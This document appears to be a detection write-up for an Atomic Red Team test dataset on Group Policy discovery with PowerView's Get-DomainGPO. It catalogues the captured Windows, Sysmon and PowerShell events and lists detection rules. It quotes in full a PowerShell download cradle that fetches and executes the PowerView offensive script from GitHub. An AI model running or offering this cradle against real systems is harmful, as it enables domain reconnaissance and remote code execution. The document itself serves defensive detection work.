# T1615-2: Group Policy Discovery — Get-DomainGPO via PowerView

## Technique Context

T1615 (Group Policy Discovery) covers adversary enumeration of Group Policy Objects (GPOs) applied to a domain. GPOs define security configurations, software deployment policies, logon scripts, and access controls — an adversary who enumerates GPOs gains a detailed map of the domain's security posture, including potential misconfigurations exploitable for privilege escalation or lateral movement. This test uses PowerView's `Get-DomainGPO` function, part of the widely-used PowerSploit/Empire offensive framework. PowerView performs LDAP queries against the domain controller to enumerate all GPO objects and their attributes. The module is loaded via an IEX (Invoke-Expression) download cradle fetching the PowerView script directly from GitHub.

## What This Dataset Contains

The dataset covers two log sources plus Sysmon: 126 PowerShell events, 15 Security events, and 5 Sysmon events.

**Sysmon (5 events)**:
- **EID 22** (DNS query) — `powershell.exe` resolving `github.com`, confirming the download cradle network activity.
- **EID 3** (network connection, 4 events) — Three connections from `MsMpEng.exe` (Windows Defender, running despite being nominally disabled via GPO) outbound to `48.211.71.194:443`, consistent with cloud telemetry lookups triggered by the PowerShell activity. One connection from `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` to `140.82.114.3:443` — GitHub's IP — confirming the download attempt reached the network layer.

**Security log (15 events)**:
- **EID 4688** (5 events) — Process creation for `whoami.exe` (identity check) and two `powershell.exe` instances. The key event shows `powershell.exe` launched with the full download cradle command: `"powershell.exe" & {powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"}`. This full command line, captured via Security 4688 with command-line auditing enabled, is the primary detection artifact.
- **EID 4689** (9 events) — Process exit events for the PowerShell instances and `whoami.exe`.
- **EID 4703** (1 event) — Token right adjustment for `powershell.exe`.

**PowerShell log (126 events)** — 121 EID 4104 script block events, 4 EID 4103 module pipeline events, and 1 EID 4100 error event. The script block samples from the 20-event sample set contain only PowerShell runtime infrastructure fragments (`Set-StrictMode`, error handlers) and `Set-ExecutionPolicy Bypass`. The PowerView download cradle and `Get-DomainGPO` invocation are captured in the full 121 EID 4104 set (visible in the Security 4688 command line), but the PowerView module body itself — which would appear as many additional 4104 blocks — is absent from the sample set, suggesting the download either failed, was blocked, or the downloaded content was not executed fully.

## What This Dataset Does Not Contain

The actual GPO enumeration results — GPO names, linked OUs, settings — are not present in any channel. PowerView's `Get-DomainGPO` returns data to the PowerShell console; this output is not captured in event logs.

LDAP query traffic to the domain controller is not visible. No Sysmon EID 3 event shows `powershell.exe` connecting to the DC on port 389 or 636, suggesting the PowerView function either did not reach the LDAP query stage (download blocked) or the connection was not captured within the Sysmon filter window.

Sysmon EID 1 (ProcessCreate) does not appear for the outer `powershell.exe` test framework process because PowerShell is not on the sysmon-modular include list. The Security log EID 4688 provides complementary process creation coverage.

## Assessment

Compared to the defended variant (4 Sysmon, 7 Security, 48 PowerShell), the undefended run produces nearly identical telemetry volume for Sysmon and Security channels, with a substantially larger PowerShell event count (126 vs. 48). The difference is in PowerShell script block volume: with Defender's AMSI disabled in the undefended environment, PowerShell script block logging captures more content from the loaded scripts without AMSI truncation or suppression side effects.

The most actionable event in this dataset is the EID 4688 command line containing the GitHub URL to the PowerView script and the `Get-DomainGPO` function call — this is captured regardless of whether the download succeeded. You will also find the outbound network connection to GitHub's IP (`140.82.114.3:443`) in Sysmon EID 3, providing a corroborating network indicator.

The `MsMpEng.exe` network connections to `48.211.71.194:443` are worth noting: Defender cloud lookup activity persists even in the nominally-disabled configuration (disabled via GPO on the UndefendedTests OU), indicating that some Defender telemetry pipeline components remain active.

## Detection Opportunities Present in This Data

- **EID 4688: Command line containing `IEX` + `DownloadString` + `powerview.ps1`** — The download cradle pattern is explicit in the 4688 command line. Alert on `powershell.exe` command lines containing `IEX`, `DownloadString`, and any variant of `powerview` (case-insensitive). The specific GitHub commit hash in the URL (`86921fbbf4945441e2f9d9e7712c5a6e96eed0f3`) is a high-confidence indicator for this exact ART test.

- **EID 4688: `Get-DomainGPO` in a PowerShell command line** — `Get-DomainGPO` is a PowerView-specific function name with no legitimate use outside offensive tooling. Its presence in a 4688 command line is a reliable high-fidelity alert.

- **EID 4688: `-nop -exec bypass` flags on `powershell.exe`** — The combination of `-NonProfile` (`-nop`) and `-ExecutionPolicy Bypass` (`-exec bypass`) in a `powershell.exe` command line is a well-known offensive PowerShell launch pattern. Alert on child processes of `powershell.exe` or `cmd.exe` launching `powershell.exe` with these flags.

- **Sysmon EID 3: `powershell.exe` connecting to `github.com` / `raw.githubusercontent.com` on port 443** — An outbound connection from `powershell.exe` to GitHub's IP ranges (`140.82.112.0/20`) is anomalous in most enterprise environments and warrants investigation. Correlate with the corresponding DNS query (EID 22) for `github.com` to confirm the download pattern.

- **EID 4104: Script block containing `Get-DomainGPO`** — If the PowerView script executes and generates script block events, the `Get-DomainGPO` function name will appear in an EID 4104 event. This provides coverage even when the Security log 4688 command line is abbreviated or missing.
